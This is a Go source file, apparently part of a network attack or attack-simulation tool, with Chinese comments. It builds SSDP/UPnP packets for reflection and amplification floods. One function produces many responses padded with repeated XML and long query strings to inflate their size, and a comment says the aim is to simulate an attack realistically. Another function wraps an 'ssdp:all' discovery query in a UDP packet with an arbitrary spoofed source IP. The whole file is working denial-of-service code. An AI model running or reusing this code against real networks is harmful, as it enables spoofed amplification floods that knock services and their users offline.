package protocol

import (
	"fmt"
	"strings"
	"time"
)

// SSDPResponseBuffer 生成SSDP响应数据 - 返回多个响应包以便循环发送
// 返回多个响应包而不是合并成一个，以便更真实地模拟攻击
func SSDPResponseBuffer() [][]byte {
    // 生成长但有效的UUID
    uuid := "uuid:" + strings.Repeat("f", 8) + "-" + 
            strings.Repeat("e", 4) + "-" + 
            strings.Repeat("d", 4) + "-" + 
            strings.Repeat("a", 4) + "-" + 
            strings.Repeat("b", 12)
    
    // 更真实的设备类型列表
    serviceTypes := []string{
        "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
        "urn:schemas-upnp-org:service:WANIPConnection:1",
        "urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1",
        "upnp:rootdevice",
        "urn:schemas-upnp-org:device:MediaServer:1",
        "urn:schemas-upnp-org:service:ContentDirectory:1",
        "urn:schemas-upnp-org:service:ConnectionManager:1",
        "urn:schemas-upnp-org:device:WANDevice:1",
        "urn:schemas-upnp-org:device:WANConnectionDevice:1",
        "urn:schemas-upnp-org:device:Basic:1",
        "urn:schemas-upnp-org:device:MediaRenderer:1",
    }
    
    // 真实的设备描述URL路径
    paths := []string{
        "gatedesc.xml",
        "igd.xml",
        "upnp/IGD.xml",
        "tr64desc.xml",
        "RootDevice.xml",
        "device.xml",
        "DeviceDescription.xml",
    }
    
    // 真实的服务器标识
    serverTypes := []string{
        "UNIX/5.0 UPnP/1.0 Cisco/1.0",
        "Linux/3.10.39 UPnP/1.0 Technicolor/1.0",
        "Debian/4.0 UPnP/1.0 MiniUPnPd/1.8",
        "Windows NT/6.1 UPnP/1.0 MiniUPnPd/1.9",
        "Ubuntu/18.04 UPnP/1.1 MiniDLNA/1.2.1",
    }
    
    // 创建一个切片来存储所有的响应数据
    responses := make([][]byte, len(serviceTypes))
    
    // 为每个服务类型生成响应
    for i, st := range serviceTypes {
        // 为每个服务类型创建随机但有效的LOCATION URL
        ipPart := fmt.Sprintf("192.168.%d.%d", (i*7)%256, (i*13)%256)
        port := 1024 + (i * 1000) % 9000
        
        pathIndex := i % len(paths)
        pathExt := paths[pathIndex]
        
        // 添加随机但有效的查询参数以增加URL长度
        queryParams := fmt.Sprintf("mac=%s&device=%s&timestamp=%d",
            strings.Replace(uuid, "uuid:", "", 1),
            strings.Repeat("router", i+1),
            time.Now().Unix() + int64(i*100))
        
        location := fmt.Sprintf("http://%s:%d/%s?%s",
            ipPart,
            port,
            pathExt,
            queryParams)
        
        // 选择服务器标识
        serverIndex := i % len(serverTypes)
        server := serverTypes[serverIndex]
        
        // 构建USN (Unique Service Name)
        usn := fmt.Sprintf("%s::%s", uuid, st)
        
        // 构建完整的响应
        response := fmt.Sprintf(
            "HTTP/1.1 200 OK\r\n"+
                "CACHE-CONTROL: max-age=1800\r\n"+
                "DATE: %s\r\n"+ // RFC1123 格式的日期 
                "EXT: \r\n"+
                "LOCATION: %s\r\n"+
                "OPT: \"http://schemas.upnp.org/upnp/1/0/\"; ns=01\r\n"+ // 合法的可选头
                "01-NLS: %s\r\n"+ // 通知ID
                "SERVER: %s\r\n"+
                "ST: %s\r\n"+
                "USN: %s\r\n"+
                "BOOTID.UPNP.ORG: %d\r\n"+ // UPnP版本1.1的扩展
                "CONFIGID.UPNP.ORG: %d\r\n"+ // UPnP版本1.1的扩展
                "CONTENT-LENGTH: %d\r\n\r\n"+
                "%s", // 额外添加一些XML内容以增加大小
            time.Now().Format(time.RFC1123),
            location,
            strings.Replace(uuid, "uuid:", "", 1),
            server,
            st,
            usn,
            time.Now().Unix() % 9999,
            (time.Now().Unix() / 10) % 999,
            1000, // 内容长度
            strings.Repeat("<device><serviceList><service></service></serviceList></device>", 50),
        )
        
        // 将响应添加到切片中
        responses[i] = []byte(response)
    }
    
    return responses
}

// SSDP协议包构造
func SSDPPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
	payload := []byte(
		"M-SEARCH * HTTP/1.1\r\n" +
			"HOST: 239.255.255.250:1900\r\n" +
			"MAN: \"ssdp:discover\"\r\n" +
			"MX: 2\r\n" +
			"ST: ssdp:all\r\n\r\n")
	return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
}
